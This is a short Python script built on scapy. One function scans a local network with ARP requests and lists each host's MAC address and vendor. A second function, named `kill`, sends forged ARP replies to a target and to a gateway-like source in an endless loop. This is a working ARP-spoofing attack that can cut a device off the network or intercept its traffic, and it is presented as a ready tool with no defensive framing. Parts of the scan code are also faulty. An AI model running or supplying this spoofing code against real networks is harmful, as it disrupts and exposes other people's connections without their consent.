from scapy.sendrecv import srp
from scapy.layers.l2 import ARP, Ether
from manuf import manuf
from scapy.all import send
import time
import multiprocessing


def arp_scan(ip):
    """
    Performs a network scan by sending ARP requests to an IP address or a range of IP addresses.
    Args:
        ip (str): An IP address or IP address range to scan. For example:
                    - 192.168.1.1 to scan a single IP address
                    - 192.168.1.1/24 to scan a range of IP addresses.
    Returns:
        A list of dictionaries mapping IP addresses to MAC addresses. For example:
        [
            {'IP': '192.168.2.1', 'MAC': 'c4:93:d9:8b:3e:5a'}
        ]
    """
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    try:
        ans, unans = srp(request, timeout=2, retry=1)
    except ValueError:
        pass

    scanned_users = {}
    result2 = []
    p = manuf.MacParser(update=True)
    for sent, received in ans:
        scanned_users[received.psrc] = {'MAC': received.hwsrc.upper(), 'Vendor': str(p.get_manuf(received.hwsrc))}
        temp = (received.psrc, received.hwsrc.upper(), str(p.get_manuf(received.hwsrc)))
        result2.append(temp)

    for received in unans:
        if received.psrc not in scanned_users:
            scanned_users[received.psrc] = {'MAC': received.hwsrc.upper(), 'Vendor': str(p.get_manuf(received.hwsrc))}
            temp = (received.psrc, received.hwsrc.upper(), str(p.get_manuf(received.hwsrc)))
            result2.append(temp)

    return result2

def kill(source, target_mac, target_ip, wait_after=1):
        """
        Spoofing target
        """
        # Cheat target
        to_target = ARP(
            op=2,
            psrc=source[0],
            hwdst=target_mac,
            pdst=target_ip
        )

        # Cheat source
        to_source = ARP(
            op=2,
            psrc=target_ip,
            hwdst=source[1],
            pdst=source[0]
        )

        while True:
            # Send packets to both target and source
            send(to_target, verbose=0)
            send(to_source, verbose=0)
            time.sleep(wait_after)
